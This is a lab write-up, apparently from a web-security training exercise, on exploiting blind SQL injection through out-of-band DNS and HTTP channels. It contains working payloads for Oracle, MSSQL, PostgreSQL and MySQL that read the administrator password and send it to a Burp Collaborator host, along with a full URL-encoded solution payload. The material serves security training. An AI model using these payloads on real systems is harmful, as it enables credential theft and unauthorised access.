**<h2>Background:</h2>**
Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:
``'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--``

This input reads the password for the **_Administrator_** user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:
``S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net``

Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel. 
>For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.

<table>
        <thead>
            <tr>
                <th>Database</th>
                <th>Query</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td>Oracle</td>
                <td><code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual</code></td>
            </tr>
            <tr>
                <td>Microsoft</td>
                <td><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')</code></td>
            </tr>
            <tr>
                <td>PostgreSQL</td>
                <td><code>create OR replace function f() returns void as $$ 
                declare c text; declare p text; begin 
                SELECT into p (SELECT YOUR-QUERY-HERE); 
                c := 'copy (SELECT '''''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN'''; execute c; 
                END; $$ language plpgsql security definer; SELECT f();</code></td>
            </tr>
            <tr>
                <td>MySQL</td>
                <td><code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'</code></td>
            </tr>
        </tbody>
    </table>


**<h2>Problem:</h2>**
The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called **_users_**, with columns called **_username_** and **_password_**. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

**<h2>Solution:</h2>**
- The application is vulnerable to OAST so proceeding with checking the password using
``'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'0rsqsimpzddepfqy02ebwiyrhin9b1zq.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--``
After polling and waiting for few seconds we get:
![alt text](/images/lab17queryop.png)
- We got DNS and HTTP output, interacting through them we see password is concatenated with the domain name.
![alt text](/images/lab17password.png)
- Copy preceedings of the domain name and login as administrator to solve the lab
